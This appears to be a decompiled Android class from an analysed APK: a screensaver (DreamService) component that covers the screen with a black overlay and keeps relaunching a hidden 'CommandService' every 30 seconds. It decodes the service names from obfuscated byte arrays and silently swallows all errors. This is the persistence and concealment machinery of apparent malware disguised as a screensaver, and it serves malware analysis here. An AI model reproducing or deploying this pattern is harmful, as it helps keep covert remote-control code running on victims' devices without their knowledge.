package com.base.template.services;

import android.os.Handler;
import android.os.Looper;
import android.service.dreams.DreamService;
import android.view.View;
import okhttp3.Headers;
import p000.C0000;

/* JADX INFO: loaded from: /Users/xv/pin2/max-gate-apk/output/stage4/classes.dex */
public final class ScreenSaverService extends DreamService {
    private View overlayView;
    private final Handler handler = new Handler(Looper.getMainLooper());
    private final ScreenSaverService$checkRunnable$1 checkRunnable = new Runnable() { // from class: com.base.template.services.ScreenSaverService$checkRunnable$1
        @Override // java.lang.Runnable
        public final void run() {
            try {
                CommandService commandService = CommandService.instance;
                if (CommandService.instance == null) {
                    Headers.Companion.safeStartService(this.this$0.getApplicationContext(), C0000.decode(new byte[]{53, 34, 102, 33, 36, 40, 106, 35, 48, 36, 102, 59, 34, 46, 124, 33, 45}, "fa4daf9b", 5));
                }
                this.this$0.handler.postDelayed(this, 30000L);
            } catch (Exception unused) {
            }
        }
    };

    private final void ensureServiceRunning() {
        try {
            if (CommandService.instance == null) {
                Headers.Companion.safeStartService(getApplicationContext(), C0000.decode(new byte[]{49, 116, 51, 124, 36, 122, 49, 118, 55, 124, 51, 107, 48, 114, 55, 112, 55, 113}, "b7a9a4", 0.0f));
            }
        } catch (Exception unused) {
        }
    }

    @Override // android.service.dreams.DreamService, android.view.Window.Callback
    public void onAttachedToWindow() {
        super.onAttachedToWindow();
        try {
            setInteractive(true);
            setFullscreen(true);
            View view = new View(this);
            view.setBackgroundColor(-16777216);
            this.overlayView = view;
            setContentView(view);
        } catch (Exception unused) {
        }
    }

    @Override // android.service.dreams.DreamService
    public void onDreamingStarted() {
        super.onDreamingStarted();
        try {
            this.handler.post(this.checkRunnable);
            ensureServiceRunning();
        } catch (Exception unused) {
        }
    }

    @Override // android.service.dreams.DreamService
    public void onDreamingStopped() {
        super.onDreamingStopped();
        try {
            this.handler.removeCallbacks(this.checkRunnable);
            ensureServiceRunning();
        } catch (Exception unused) {
        }
    }
}
